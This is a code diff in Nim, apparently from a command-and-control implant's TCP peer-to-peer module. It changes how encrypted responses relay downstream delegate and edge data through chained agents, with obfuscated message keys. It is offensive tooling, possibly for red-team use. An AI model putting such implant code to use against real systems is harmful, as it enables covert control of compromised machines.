@@ -577,8 +577,6 @@ proc start*(profile: TcpProfile) {.async.} =
               if chunksToSend.len > 0:
                 # Collect downstream delegate data (multi-level P2P)
                 let (downDelegates, downEdges) = collectDownstreamDelegates()
-                for e in downEdges:
-                  chunksToSend.add(e)
                 
                 let chunkResponse = %* {
                   obf("action"): obf("post_response"),
@@ -587,6 +585,9 @@ proc start*(profile: TcpProfile) {.async.} =
                 if downDelegates.len > 0:
                   chunkResponse[obf("delegates")] = downDelegates
                   debug "[DEBUG] TCP P2P: Including ", downDelegates.len, " downstream delegate(s) with chunk response"
+                if downEdges.len > 0:
+                  chunkResponse[obf("edges")] = downEdges
+                  debug "[DEBUG] TCP P2P: Including ", downEdges.len, " downstream edge(s) with chunk response"
                 
                 debug "[DEBUG] TCP P2P: Sending ", chunksToSend.len, " download chunk(s)"
                 let responseEncrypted = profile.encryptMessage($chunkResponse, profile.callbackUuid)
@@ -598,11 +599,14 @@ proc start*(profile: TcpProfile) {.async.} =
               if noChunkDelegates.len > 0 or noChunkEdges.len > 0:
                 let delegateResponse = %* {
                   obf("action"): obf("post_response"),
-                  obf("responses"): noChunkEdges
+                  obf("responses"): []
                 }
                 if noChunkDelegates.len > 0:
                   delegateResponse[obf("delegates")] = noChunkDelegates
                   debug "[DEBUG] TCP P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
+                if noChunkEdges.len > 0:
+                  delegateResponse[obf("edges")] = noChunkEdges
+                  debug "[DEBUG] TCP P2P: Sending ", noChunkEdges.len, " downstream edge(s) (no chunks)"
                 let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                 await sendChunkedMessage(client, responseEncrypted)
               else:
@@ -809,8 +813,6 @@ proc start*(profile: TcpProfile) {.async.} =
                   
                   # Collect downstream delegate data (multi-level P2P)
                   let (taskDelegates, taskEdges) = collectDownstreamDelegates()
-                  for e in taskEdges:
-                    taskResponses.add(e)
                   
                   # Send response with task results
                   let taskingResponse = %* {
@@ -820,23 +822,15 @@ proc start*(profile: TcpProfile) {.async.} =
                   if taskDelegates.len > 0:
                     taskingResponse[obf("delegates")] = taskDelegates
                     debug "[DEBUG] TCP P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
-                  
-                  # If exit command was received, include edge removal in the response
-                  if shouldExit:
-                    debug "[DEBUG] TCP P2P: Including edge removal notification in response"
-                    taskingResponse[obf("edges")] = %* [
-                      %* {
-                        obf("source"): "",
-                        obf("destination"): profile.callbackUuid,
-                        obf("action"): obf("remove"),
-                        obf("c2_profile"): "tcp"
-                      }
-                    ]
+                  if taskEdges.len > 0:
+                    taskingResponse[obf("edges")] = taskEdges
+                    debug "[DEBUG] TCP P2P: Including ", taskEdges.len, " downstream edge(s) with task response"
                   
                   debug "[DEBUG] TCP P2P: Sending ", taskResponses.len, " task response(s)"
                   let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
                   await sendChunkedMessage(client, responseEncrypted)
                   
+                  # If exit was requested, wait and break (parent will detect EOF and send edge removal)
                   if shouldExit:
                     debug "[DEBUG] TCP P2P: Exit command sent, waiting 500ms for delivery before shutdown"
                     await sleepAsync(500)  # Give time for message to be received and processed
@@ -849,11 +843,14 @@ proc start*(profile: TcpProfile) {.async.} =
                   if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
                     let delegateResponse = %* {
                       obf("action"): obf("post_response"),
-                      obf("responses"): noTaskEdges
+                      obf("responses"): []
                     }
                     if noTaskDelegates.len > 0:
                       delegateResponse[obf("delegates")] = noTaskDelegates
                       debug "[DEBUG] TCP P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
+                    if noTaskEdges.len > 0:
+                      delegateResponse[obf("edges")] = noTaskEdges
+                      debug "[DEBUG] TCP P2P: Sending ", noTaskEdges.len, " downstream edge(s) (no tasks)"
                     let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                     await sendChunkedMessage(client, responseEncrypted)
                   else:
